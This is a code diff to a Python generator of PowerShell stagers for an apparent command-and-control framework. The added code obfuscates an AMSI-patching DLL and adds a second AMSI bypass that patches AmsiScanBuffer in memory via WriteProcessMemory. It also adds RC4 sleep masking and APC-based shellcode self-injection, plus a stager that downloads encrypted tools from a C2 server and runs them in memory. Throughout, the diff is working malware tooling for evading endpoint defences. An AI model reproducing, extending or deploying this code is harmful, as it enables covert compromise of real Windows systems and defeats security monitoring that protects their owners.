@@ -132,9 +132,26 @@ _INJECT_DLL_CACHE: tuple[bytes, str] | None = None  # (dll_bytes, class_name), b
 def _compile_amsi_dll(cls_name: str) -> bytes | None:
     """Compile a minimal AMSI-patch DLL targeting netstandard2.0.
     No PDB, no debug info, no version resource that leaks build paths.
+    All sensitive strings and patch bytes are XOR-encoded so they don't appear
+    as plaintext in the DLL binary — prevents CLR AMSI from detecting the patch
+    before Assembly.Load completes.
     Returns raw DLL bytes or None on failure."""
     if not shutil.which("dotnet"):
         return None
+
+    # Random key — regenerated per build so patch bytes differ every time
+    xk = random.randint(1, 254)
+
+    def _xe(s: str) -> str:
+        return ",".join(str(ord(c) ^ xk) for c in s)
+
+    def _xb(b: list[int]) -> str:
+        return ",".join(str(v ^ xk) for v in b)
+
+    lib_enc   = _xe("amsi.dll")           # no plaintext "amsi.dll" in binary
+    proc_enc  = _xe("AmsiOpenSession")    # no plaintext "AmsiOpenSession" in binary
+    # mov eax,0x80070057 ; ret  →  AmsiOpenSession returns E_INVALIDARG
+    patch_enc = _xb([0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3])
 
     cs_source = (
         "using System;\n"
@@ -142,15 +159,22 @@ def _compile_amsi_dll(cls_name: str) -> bytes | None:
         f"public class {cls_name}{{\n"
         "  [DllImport(\"kernel32\")] static extern IntPtr GetProcAddress(IntPtr m,string n);\n"
         "  [DllImport(\"kernel32\")] static extern IntPtr LoadLibrary(string n);\n"
-        "  [DllImport(\"ntdll\")] static extern int NtProtectVirtualMemory(IntPtr h,ref IntPtr b,ref UIntPtr s,uint p,out uint o);\n"
+        "  [DllImport(\"kernel32\")] static extern bool VirtualProtect(IntPtr p,UIntPtr s,uint f,out uint o);\n"
+        # Decode helper — converts XOR'd byte array back to string at runtime
+        "  static string D(byte[]b,byte k){char[]c=new char[b.Length];for(int i=0;i<b.Length;i++)c[i]=(char)(b[i]^k);return new string(c);}\n"
         "  public static void P(){\n"
-        "    IntPtr l=LoadLibrary(\"amsi.dll\");\n"
-        "    IntPtr p=GetProcAddress(l,\"AmsiOpenSession\");\n"
-        "    IntPtr np=p;UIntPtr ns=(UIntPtr)8;uint old=0;\n"
-        "    NtProtectVirtualMemory((IntPtr)(-1),ref np,ref ns,0x04,out old);\n"
-        "    byte[] byt=new byte[]{0xB8,0x57,0x00,0x07,0x80,0xC3};\n"
-        "    Marshal.Copy(byt,0,p,6);\n"
-        "    NtProtectVirtualMemory((IntPtr)(-1),ref np,ref ns,old,out old);\n"
+        f"    byte k={(xk & 0xFF)};\n"
+        f"    byte[]el=new byte[]{{{lib_enc}}};\n"
+        f"    byte[]ep=new byte[]{{{proc_enc}}};\n"
+        f"    byte[]eb=new byte[]{{{patch_enc}}};\n"
+        "    byte[]bt=new byte[eb.Length];for(int i=0;i<eb.Length;i++)bt[i]=(byte)(eb[i]^k);\n"
+        "    IntPtr l=LoadLibrary(D(el,k));\n"
+        "    if(l==IntPtr.Zero)return;\n"
+        "    IntPtr p=GetProcAddress(l,D(ep,k));\n"
+        "    if(p==IntPtr.Zero)return;\n"
+        "    uint old;VirtualProtect(p,(UIntPtr)bt.Length,0x40,out old);\n"
+        "    Marshal.Copy(bt,0,p,bt.Length);\n"
+        "    VirtualProtect(p,(UIntPtr)bt.Length,old,out old);\n"
         "  }\n"
         "}\n"
     )
@@ -237,6 +261,16 @@ def _compile_inject_dll(cls_name: str) -> bytes | None:
         "  [DllImport(\"ntdll\")] static extern int NtCreateThreadEx(out IntPtr t,uint a,IntPtr oa,IntPtr ph,IntPtr sr,IntPtr ag,uint f,UIntPtr zb,UIntPtr ss,UIntPtr ms,IntPtr al);\n"
         "  [DllImport(\"ntdll\")] static extern int NtWaitForSingleObject(IntPtr h,bool al,IntPtr to);\n"
         "  [DllImport(\"ntdll\")] static extern int NtClose(IntPtr h);\n"
+        "  [DllImport(\"kernel32\")] static extern uint QueueUserAPC(IntPtr fn,IntPtr th,IntPtr data);\n"
+        "  [DllImport(\"kernel32\")] static extern IntPtr GetCurrentThread();\n"
+        "  [DllImport(\"kernel32\")] static extern uint SleepEx(uint ms,bool alertable);\n"
+        # RC4 (self-inverse): used for sleep masking instead of single-byte XOR
+        "  static byte[] RC4(byte[]d,byte[]k){\n"
+        "    byte[]s=new byte[256];for(int i=0;i<256;i++)s[i]=(byte)i;\n"
+        "    int j=0;for(int i=0;i<256;i++){j=(j+s[i]+k[i%k.Length])&255;byte t=s[i];s[i]=s[j];s[j]=t;}\n"
+        "    byte[]o=new byte[d.Length];int x=0;j=0;\n"
+        "    for(int i=0;i<d.Length;i++){x=(x+1)&255;j=(j+s[x])&255;byte t=s[x];s[x]=s[j];s[j]=t;o[i]=(byte)(d[i]^s[(s[x]+s[j])&255]);}\n"
+        "    return o;}\n"
         # Stomp returns RW — _Exec applies the mask, then sets final protection
         "  static IntPtr Stomp(byte[] sc){\n"
         "    string[] libs={\"wintrust.dll\",\"cryptnet.dll\",\"coml2.dll\",\"rasapi32.dll\"};\n"
@@ -262,30 +296,47 @@ def _compile_inject_dll(cls_name: str) -> bytes | None:
         "    }\n"
         "    return IntPtr.Zero;\n"
         "  }\n"
-        # _Exec: self-inject with XOR+NOACCESS sleep masking
+        # _Exec: drip allocation + RC4 sleep masking + QueueUserAPC-to-self (no NtCreateThreadEx)
         "  static IntPtr _Exec(byte[] sc){\n"
         "    IntPtr hp=(IntPtr)(-1);\n"
         "    IntPtr exec=Stomp(sc);\n"
         "    if(exec==IntPtr.Zero){\n"
-        "      IntPtr b=IntPtr.Zero;UIntPtr s=(UIntPtr)(uint)sc.Length;\n"
-        "      NtAllocateVirtualMemory(hp,ref b,IntPtr.Zero,ref s,0x3000,0x04);\n"
+        "      IntPtr b=IntPtr.Zero;\n"
+        "      UIntPtr rsz=(UIntPtr)(uint)((sc.Length+0xFFF)&~0xFFF);\n"
+        "      NtAllocateVirtualMemory(hp,ref b,IntPtr.Zero,ref rsz,0x2000,0x01);\n"
         "      if(b==IntPtr.Zero)return IntPtr.Zero;\n"
-        "      Marshal.Copy(sc,0,b,sc.Length);\n"
         "      exec=b;\n"
+        "      for(int p=0;p<sc.Length;p+=0x1000){\n"
+        "        IntPtr pg=new IntPtr(exec.ToInt64()+p);UIntPtr pgsz=(UIntPtr)0x1000;\n"
+        "        NtAllocateVirtualMemory(hp,ref pg,IntPtr.Zero,ref pgsz,0x1000,0x04);\n"
+        "        int chunk=sc.Length-p>0x1000?0x1000:sc.Length-p;\n"
+        "        byte[]sl=new byte[chunk];Array.Copy(sc,p,sl,0,chunk);\n"
+        "        UIntPtr wr=UIntPtr.Zero;\n"
+        "        NtWriteVirtualMemory(hp,new IntPtr(exec.ToInt64()+p),sl,(UIntPtr)(uint)chunk,out wr);\n"
+        "        Sleep((uint)(3+(p/0x1000)%5));\n"
+        "      }\n"
         "    }\n"
-        "    byte xk=(byte)(((uint)Environment.TickCount>>3)|1);\n"
-        "    for(int xi=0;xi<sc.Length;xi++) Marshal.WriteByte(exec,xi,(byte)(Marshal.ReadByte(exec,xi)^xk));\n"
+        "    uint tc2=(uint)Environment.TickCount;\n"
+        "    byte[]rk=new byte[16];\n"
+        "    for(int i=0;i<16;i++) rk[i]=(byte)((tc2>>((i&3)*8))^(i*17)^0xA5);\n"
+        "    byte[]enc=new byte[sc.Length];\n"
+        "    for(int i=0;i<sc.Length;i++) enc[i]=Marshal.ReadByte(exec,i);\n"
+        "    enc=RC4(enc,rk);\n"
+        "    for(int i=0;i<sc.Length;i++) Marshal.WriteByte(exec,i,enc[i]);\n"
         "    IntPtr ep=exec;UIntPtr ps=(UIntPtr)(uint)sc.Length;uint o=0;\n"
         "    NtProtectVirtualMemory(hp,ref ep,ref ps,0x01,out o);\n"
         "    Sleep(2000u+((uint)Environment.TickCount%3000u));\n"
         "    ep=exec;ps=(UIntPtr)(uint)sc.Length;\n"
         "    NtProtectVirtualMemory(hp,ref ep,ref ps,0x04,out o);\n"
-        "    for(int xi=0;xi<sc.Length;xi++) Marshal.WriteByte(exec,xi,(byte)(Marshal.ReadByte(exec,xi)^xk));\n"
+        "    byte[]dec=new byte[sc.Length];\n"
+        "    for(int i=0;i<sc.Length;i++) dec[i]=Marshal.ReadByte(exec,i);\n"
+        "    dec=RC4(dec,rk);\n"
+        "    for(int i=0;i<sc.Length;i++) Marshal.WriteByte(exec,i,dec[i]);\n"
         "    ep=exec;ps=(UIntPtr)(uint)sc.Length;\n"
         "    NtProtectVirtualMemory(hp,ref ep,ref ps,0x20,out o);\n"
-        "    IntPtr t=IntPtr.Zero;\n"
-        "    NtCreateThreadEx(out t,0x1FFFFF,IntPtr.Zero,hp,exec,IntPtr.Zero,0,UIntPtr.Zero,(UIntPtr)0x200000,(UIntPtr)0x200000,IntPtr.Zero);\n"
-        "    return t;\n"
+        "    QueueUserAPC(exec,GetCurrentThread(),IntPtr.Zero);\n"
+        "    SleepEx(0xFFFFFFFFu,true);\n"
+        "    return IntPtr.Zero;\n"
         "  }\n"
         # RunRemote: inject into an existing user-session process; fall back to self-inject
         "  static bool _RemoteInject(IntPtr hProc,byte[] sc){\n"
@@ -612,16 +663,41 @@ def _compile_clr_runner_dll(cls_name: str) -> bytes | None:
 
     cs_source = (
         "using System;\n"
+        "using System.IO;\n"
         "using System.Reflection;\n"
+        "using System.Text;\n"
         f"public class {cls_name}{{\n"
+        # Run() is void — it captures Console.Out, runs the tool, and writes the
+        # captured output directly to the raw Win32 stdout stream (bypassing
+        # PowerShell's CLIXML serializer). ProcessExit handler covers Environment.Exit().
+        "  static void Flush(StringWriter sw,bool[]done){\n"
+        "    if(done[0])return;done[0]=true;\n"
+        "    try{\n"
+        "      var raw=Console.OpenStandardOutput();\n"
+        "      byte[]b=Encoding.UTF8.GetBytes(sw.ToString());\n"
+        "      raw.Write(b,0,b.Length);raw.Flush();\n"
+        "    }catch{}\n"
+        "  }\n"
         "  public static void Run(byte[] asm,string argStr){\n"
+        "    var sw=new StringWriter();\n"
+        "    Console.SetOut(sw);Console.SetError(sw);\n"
+        "    bool[]done={false};\n"
+        "    AppDomain.CurrentDomain.ProcessExit+=(s,e)=>Flush(sw,done);\n"
         "    try{\n"
         "      Assembly a=Assembly.Load(asm);\n"
-        "      MethodInfo e=a.EntryPoint;if(e==null)return;\n"
-        "      string[]args=string.IsNullOrEmpty(argStr)?new string[0]:argStr.Split(' ');\n"
-        "      object[]p=e.GetParameters().Length==0?null:new object[]{args};\n"
-        "      e.Invoke(null,p);\n"
-        "    }catch{}\n"
+        "      MethodInfo e=a.EntryPoint;\n"
+        "      if(e!=null){\n"
+        "        string[]args=string.IsNullOrEmpty(argStr)?new string[0]:argStr.Split(' ');\n"
+        "        object[]p=e.GetParameters().Length==0?null:new object[]{args};\n"
+        "        e.Invoke(null,p);\n"
+        "      }\n"
+        "    }catch(Exception ex){\n"
+        "      try{\n"
+        "        byte[]d=Encoding.UTF8.GetBytes(\"[D:runner] \"+ex.GetType().Name+\": \"+ex.Message+\"\\n\");\n"
+        "        Console.OpenStandardOutput().Write(d,0,d.Length);\n"
+        "      }catch{}\n"
+        "    }\n"
+        "    Flush(sw,done);\n"
         "  }\n"
         "}\n"
     )
@@ -777,31 +853,105 @@ def _get_clr_runner_dll() -> tuple[bytes, str] | None:
     return _CLR_RUNNER_DLL_CACHE
 
 
+def _amsi_clr_asb_patch() -> str:
+    """CLR-level AMSI bypass: DynamicMethod+EmitCalli → kernel32!WriteProcessMemory.
+
+    Patches amsi.dll!AmsiScanBuffer in-process to return E_INVALIDARG (0x80070057).
+    After this, every CLR Assembly.Load call has its AMSI scan return failure →
+    CLR skips the block and loads the assembly unconditionally.
+
+    Why this approach:
+    - Assembly.Load(amsiDll) is itself scanned → chicken-and-egg if we load a bypass DLL
+    - Add-Type compiles + Assembly.Load → same problem
+    - DynamicMethod IL is JIT-compiled in-process, never passed to AmsiScanBuffer
+    - PE export walk via Marshal.ReadInt* uses only already-loaded .NET types
+    - WriteProcessMemory(self, addr, ...) bypasses page protection internally on Windows
+    """
+    M  = "[Runtime.InteropServices.Marshal]"
+    OC = "[System.Reflection.Emit.OpCodes]"
+
+    # Temp PE-walk vars reused for k32 and amsi walks (second overwrites first — fine)
+    vnt  = _rv(); vmg = _rv(); veo = _rv(); ver = _rv(); ved = _rv()
+    vnn  = _rv(); vfr = _rv(); vnr = _rv(); vor = _rv()
+    vi   = _rv(); vna = _rv(); vns = _rv(); vod = _rv(); vfv = _rv()
+
+    vmds = _rv()   # module list
+    vk32 = _rv()   # kernel32 base (Int64)
+    vams = _rv()   # amsi.dll base (Int64)
+    vwpm = _rv()   # WriteProcessMemory address (IntPtr)
+    vasb = _rv()   # AmsiScanBuffer address (IntPtr)
+    vpt  = _rv()   # param types array
+    vdm  = _rv()   # DynamicMethod
+    vil  = _rv()   # ILGenerator
+    vdel = _rv()   # delegate
+    vpb  = _rv()   # unmanaged patch buffer
+
+    def pe_find(base_var: str, func_name: str, result_var: str) -> list[str]:
+        """PS lines: walk PE export table of base_var (Int64), store func IntPtr in result_var."""
+        return [
+            f"{vnt}={M}::ReadInt32([IntPtr]({base_var}+0x3C))",
+            f"{vmg}={M}::ReadInt16([IntPtr]({base_var}+{vnt}+24))",
+            f"{veo}=if({vmg}-eq0x20B){{112}}else{{96}}",
+            f"{ver}={M}::ReadInt32([IntPtr]({base_var}+{vnt}+24+{veo}))",
+            f"{ved}={base_var}+{ver}",
+            f"{vnn}={M}::ReadInt32([IntPtr]({ved}+0x18))",
+            f"{vfr}={M}::ReadInt32([IntPtr]({ved}+0x1C))",
+            f"{vnr}={M}::ReadInt32([IntPtr]({ved}+0x20))",
+            f"{vor}={M}::ReadInt32([IntPtr]({ved}+0x24))",
+            f"{result_var}=[IntPtr]::Zero",
+            (
+                f"for({vi}=0;{vi}-lt{vnn};{vi}++){{{vna}={M}::ReadInt32([IntPtr]({base_var}+{vnr}+{vi}*4));"
+                f"{vns}={M}::PtrToStringAnsi([IntPtr]({base_var}+{vna}));"
+                f"if({vns}-eq'{func_name}'){{{vod}={M}::ReadInt16([IntPtr]({base_var}+{vor}+{vi}*2));"
+                f"{vfv}={M}::ReadInt32([IntPtr]({base_var}+{vfr}+{vod}*4));"
+                f"{result_var}=[IntPtr]({base_var}+{vfv});break}}}}"
+            ),
+        ]
+
+    lines = [
+        f"{vmds}=[Diagnostics.Process]::GetCurrentProcess().Modules",
+        f"{vk32}=[Int64]($({vmds}|?{{$_.ModuleName-ieq'kernel32.dll'}})[0].BaseAddress)",
+    ]
+    lines += pe_find(vk32, "WriteProcessMemory", vwpm)
+    lines += [
+        f"{vams}=[Int64]($({vmds}|?{{$_.ModuleName-ieq'amsi.dll'}})[0].BaseAddress)",
+    ]
+    lines += pe_find(vams, "AmsiScanBuffer", vasb)
+    lines += [
+        # DynamicMethod: int wpm(IntPtr hProc, IntPtr addr, IntPtr buf, IntPtr sz, IntPtr written)
+        f"{vpt}=[Type[]]@([IntPtr],[IntPtr],[IntPtr],[IntPtr],[IntPtr])",
+        f"{vdm}=[System.Reflection.Emit.DynamicMethod]::new('w',[int],{vpt},[Runtime.InteropServices.Marshal].Module,$true)",
+        f"{vil}={vdm}.GetILGenerator()",
+        f"{vil}.Emit({OC}::Ldarg_0)",
+        f"{vil}.Emit({OC}::Ldarg_1)",
+        f"{vil}.Emit({OC}::Ldarg_2)",
+        f"{vil}.Emit({OC}::Ldarg_3)",
+        f"{vil}.Emit({OC}::Ldarg_S,[byte]4)",
+        f"{vil}.Emit({OC}::Ldc_I8,{vwpm}.ToInt64())",
+        f"{vil}.Emit({OC}::Conv_I)",
+        f"{vil}.EmitCalli({OC}::Calli,[Runtime.InteropServices.CallingConvention]::StdCall,[int],{vpt})",
+        f"{vil}.Emit({OC}::Ret)",
+        f"{vdel}={vdm}.CreateDelegate([Func[IntPtr,IntPtr,IntPtr,IntPtr,IntPtr,int]])",
+        # Allocate unmanaged buffer for patch bytes B8 57 00 07 80 C3
+        f"{vpb}={M}::AllocHGlobal(6)",
+        f"{M}::WriteByte({vpb},0,0xB8)",
+        f"{M}::WriteByte({vpb},1,0x57)",
+        f"{M}::WriteByte({vpb},2,0x00)",
+        f"{M}::WriteByte({vpb},3,0x07)",
+        f"{M}::WriteByte({vpb},4,0x80)",
+        f"{M}::WriteByte({vpb},5,0xC3)",
+        # WriteProcessMemory(-1, AmsiScanBuffer, patchBuf, 6, null) — handles page prot internally
+        f"if({vasb}-ne[IntPtr]::Zero){{{vdel}.Invoke([IntPtr](-1),{vasb},{vpb},[IntPtr]6,[IntPtr]::Zero)|Out-Null}}",
+        f"{M}::FreeHGlobal({vpb})",
+    ]
+    return "\n".join(lines)
+
+
 def _amsi_from_bytes() -> str:
-    """PS1 block: decode XOR-encrypted DLL bytes → load from memory → invoke patch.
-    No Add-Type, no CSC.exe, no file drop on target."""
-    result = _get_amsi_dll()
-    if result is None:
-        return _amsi_reflection_fallback()
-
-    dll_bytes, cls_name = result
-
-    vk, vraw, vdll, vi, vasm = _rv(), _rv(), _rv(), _rv(), _rv()
-    key = random.randint(1, 254)
-    enc = [b ^ key for b in dll_bytes]
-    arr = ",".join(f"0x{b:02X}" for b in enc)
-
-    # cls_name is split to avoid a plain-text type name in the PS1
-    cls_split = _split(cls_name)
-
-    return "\n".join([
-        f"{vk}={key}",
-        f"{vraw}=[byte[]]({arr})",
-        f"{vdll}=New-Object byte[] {vraw}.Length",
-        f"for({vi}=0;{vi} -lt {vraw}.Length;{vi}++){{{vdll}[{vi}]={vraw}[{vi}] -bxor {vk}}}",
-        f"{vasm}=[Reflection.Assembly]::Load({vdll})",
-        f"{vasm}.GetType({cls_split}).GetMethod('P').Invoke($null,$null)",
-    ])
+    """CLR-level AMSI bypass via DynamicMethod+calli+WriteProcessMemory.
+    Replaces the prior Assembly.Load-based AMSI DLL approach which was blocked
+    by CLR AMSI scanning the DLL itself before it could patch anything."""
+    return _amsi_clr_asb_patch()
 
 
 def _amsi_reflection_fallback() -> str:
@@ -1475,11 +1625,13 @@ def _stager_clr_inline(
                 f"{vprm}[0]=[byte[]]{vsc}",
                 f"{vprm}[1]=$null",
             ]
+        # Run() is void — it captures Console.Out/Err internally and writes
+        # the captured output directly to the raw Win32 stdout from C#.
         invoke_expr = f"{vdasm}.GetType({cls_split}).GetMethod('Run').Invoke($null,{vprm})"
     else:
         print("[!] CLR runner DLL unavailable — dotnet SDK not found; using PS1-native Assembly.Load fallback")
         clr_load_lines = []
-        vasm, ve = _rv(), _rv()
+        vasm, ve, vsw, vout = _rv(), _rv(), _rv(), _rv()
         if tool_args:
             akey = random.randint(15, 200)
             vak, varg = _rv(), _rv()
@@ -1489,16 +1641,26 @@ def _stager_clr_inline(
                 f"{varg}={_xdec(aenc, vak)}",
             ]
             invoke_expr = "\n".join([
+                f"{vsw}=New-Object IO.StringWriter",
+                f"[Console]::SetOut({vsw}); [Console]::SetError({vsw})",
                 f"{vasm}=[Reflection.Assembly]::Load({vsc})",
                 f"{ve}={vasm}.EntryPoint",
                 f"if({ve}){{try{{{ve}.Invoke($null,[object[]]@(,@({varg}.Split(' '))))}}catch{{}}}}",
+                f"{vout}=New-Object IO.StreamWriter([Console]::OpenStandardOutput())",
+                f"{vout}.AutoFlush=$true; [Console]::SetOut({vout})",
+                f"{vout}.Write({vsw}.ToString()); {vout}.Flush()",
             ])
         else:
             args_lines = []
             invoke_expr = "\n".join([
+                f"{vsw}=New-Object IO.StringWriter",
+                f"[Console]::SetOut({vsw}); [Console]::SetError({vsw})",
                 f"{vasm}=[Reflection.Assembly]::Load({vsc})",
                 f"{ve}={vasm}.EntryPoint",
                 f"if({ve}){{try{{{ve}.Invoke($null,$null)}}catch{{}}}}",
+                f"{vout}=New-Object IO.StreamWriter([Console]::OpenStandardOutput())",
+                f"{vout}.AutoFlush=$true; [Console]::SetOut({vout})",
+                f"{vout}.Write({vsw}.ToString()); {vout}.Flush()",
             ])
 
     lines = [
@@ -1832,3 +1994,126 @@ def generate_stager(
             print(f"      {line}")
 
     return ps1
+
+
+# ── Tool execution stager (blocking — stdout captured by agent) ───────────────
+
+def _stager_tool_native(tool_url: str, ua: str, jitter_min: int, jitter_max: int) -> str:
+    """Stager for native PE shellcode (.enc): AMSI bypass + inject DLL Run() (blocking).
+    Runs shellcode in the PS1 process so stdout flows back to the C2 agent."""
+    vraw, vb64, vsc = _rv(), _rv(), _rv()
+    sc_setup, vurl = _xurl(tool_url)
+
+    inject_result = _get_inject_dll()
+    if inject_result is not None:
+        dll_bytes, cls_name = inject_result
+        vdk, vdraw, vddll, vdi, vdasm = _rv(), _rv(), _rv(), _rv(), _rv()
+        dll_key  = random.randint(1, 254)
+        dll_enc  = [b ^ dll_key for b in dll_bytes]
+        dll_arr  = ",".join(f"0x{b:02X}" for b in dll_enc)
+        cls_split = _split(cls_name)
+        vprm = _rv()
+        inject_lines = [
+            f"{vdk}={dll_key}",
+            f"{vdraw}=[byte[]]({dll_arr})",
+            f"{vddll}=New-Object byte[] {vdraw}.Length",
+            f"for({vdi}=0;{vdi} -lt {vdraw}.Length;{vdi}++){{{vddll}[{vdi}]={vdraw}[{vdi}] -bxor {vdk}}}",
+            f"{vdasm}=[Reflection.Assembly]::Load({vddll})",
+        ]
+        prm_lines = [
+            f"{vprm}=New-Object object[] 1",
+            f"{vprm}[0]=[byte[]]{vsc}",
+        ]
+        # Run() = blocking NtWaitForSingleObject, stdout stays in PS1 process
+        invoke_expr = f"{vdasm}.GetType({cls_split}).GetMethod('Run').Invoke($null,{vprm})"
+    else:
+        # Inline Add-Type fallback — blocking NtWait so stdout is captured
+        key = random.randint(10, 200)
+        cls = _rclass()
+        cs_inject = (
+            f"using System; using System.Runtime.InteropServices; "
+            f"public class {cls}{{ "
+            f"[DllImport(\"kernel32\")] static extern void Sleep(uint ms); "
+            f"[DllImport(\"ntdll\")] static extern int NtAllocateVirtualMemory(IntPtr h,ref IntPtr b,IntPtr z,ref UIntPtr s,uint t,uint p); "
+            f"[DllImport(\"ntdll\")] static extern int NtProtectVirtualMemory(IntPtr h,ref IntPtr b,ref UIntPtr s,uint p,out uint o); "
+            f"[DllImport(\"ntdll\")] static extern int NtCreateThreadEx(out IntPtr t,uint a,IntPtr oa,IntPtr ph,IntPtr sr,IntPtr ag,uint f,UIntPtr zb,UIntPtr ss,UIntPtr ms,IntPtr al); "
+            f"[DllImport(\"ntdll\")] static extern int NtWaitForSingleObject(IntPtr h,bool al,IntPtr to); "
+            f"[DllImport(\"ntdll\")] static extern int NtClose(IntPtr h); "
+            f"public static void Run(byte[] sc){{ "
+            f"IntPtr hp=(IntPtr)(-1);IntPtr b=IntPtr.Zero;UIntPtr s=(UIntPtr)(uint)sc.Length; "
+            f"NtAllocateVirtualMemory(hp,ref b,IntPtr.Zero,ref s,0x3000,0x04); "
+            f"if(b==IntPtr.Zero)return; "
+            f"System.Runtime.InteropServices.Marshal.Copy(sc,0,b,sc.Length); "
+            f"byte xk=(byte)(((uint)Environment.TickCount>>3)|1); "
+            f"for(int xi=0;xi<sc.Length;xi++) System.Runtime.InteropServices.Marshal.WriteByte(b,xi,(byte)(System.Runtime.InteropServices.Marshal.ReadByte(b,xi)^xk)); "
+            f"IntPtr ep=b;UIntPtr ps=(UIntPtr)(uint)sc.Length;uint o=0; "
+            f"NtProtectVirtualMemory(hp,ref ep,ref ps,0x01,out o); "
+            f"Sleep(2000u+((uint)Environment.TickCount%3000u)); "
+            f"ep=b;ps=(UIntPtr)(uint)sc.Length; "
+            f"NtProtectVirtualMemory(hp,ref ep,ref ps,0x04,out o); "
+            f"for(int xi=0;xi<sc.Length;xi++) System.Runtime.InteropServices.Marshal.WriteByte(b,xi,(byte)(System.Runtime.InteropServices.Marshal.ReadByte(b,xi)^xk)); "
+            f"ep=b;ps=(UIntPtr)(uint)sc.Length; "
+            f"NtProtectVirtualMemory(hp,ref ep,ref ps,0x20,out o); "
+            f"IntPtr t=IntPtr.Zero;NtCreateThreadEx(out t,0x1FFFFF,IntPtr.Zero,hp,b,IntPtr.Zero,0,UIntPtr.Zero,(UIntPtr)0x200000,(UIntPtr)0x200000,IntPtr.Zero); "
+            f"if(t!=IntPtr.Zero){{NtWaitForSingleObject(t,false,IntPtr.Zero);NtClose(t);}}"
+            f"}} }}"
+        )
+        cs_bytes = [ord(c) ^ key for c in cs_inject]
+        cs_enc   = "[byte[]](" + ",".join(str(b) for b in cs_bytes) + ")"
+        vcs, vck = _rv(), _rv()
+        inject_lines = [
+            f"{vck}={key}",
+            f"{vcs}=[Text.Encoding]::ASCII.GetString(({cs_enc}|%{{$_ -bxor {vck}}}))",
+            f"Add-Type {vcs}",
+        ]
+        prm_lines  = []
+        invoke_expr = f"[{cls}]::Run({vsc})"
+
+    lines = [
+        "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12",
+        "",
+        _sbl_bypass(),
+        "",
+        _amsi_from_bytes(),
+        "",
+        *inject_lines,
+        "",
+        _jitter(jitter_min, jitter_max),
+        "",
+        sc_setup,
+        _sslstream_get(vurl, vraw, ua),
+        "",
+        f"{vb64}=[Convert]::FromBase64String([Text.Encoding]::ASCII.GetString({vraw}))",
+        _xor2_decode_bytes(vb64, vsc),
+        "",
+        *prm_lines,
+        invoke_expr,
+    ]
+    return "\n".join(lines)
+
+
+_DEFAULT_UA = (
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
+    "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0"
+)
+
+
+def build_tool_stager(
+    tool_url:    str,
+    clr:         bool,
+    params:      str | None = None,
+    jitter_min:  int = 1500,
+    jitter_max:  int = 4000,
+) -> str:
+    """Generate an in-memory execution stager PS1 for a tool .enc.
+
+    CLR tools  → Assembly.Load via _stager_clr_inline (blocking, stdout captured).
+    Native PE  → inject DLL Run() via _stager_tool_native (blocking, stdout captured).
+
+    The returned PS1 is hosted on the C2 server and fetched by a short bootstrap
+    command sent to the agent — no -enc giant blob, AMSI bypassed before tool loads.
+    """
+    _preamble = "$ProgressPreference='SilentlyContinue';$ErrorActionPreference='SilentlyContinue'"
+    if clr:
+        return _preamble + "\n" + _stager_clr_inline(tool_url, params or None, _DEFAULT_UA, jitter_min, jitter_max)
+    return _preamble + "\n" + _stager_tool_native(tool_url, _DEFAULT_UA, jitter_min, jitter_max)
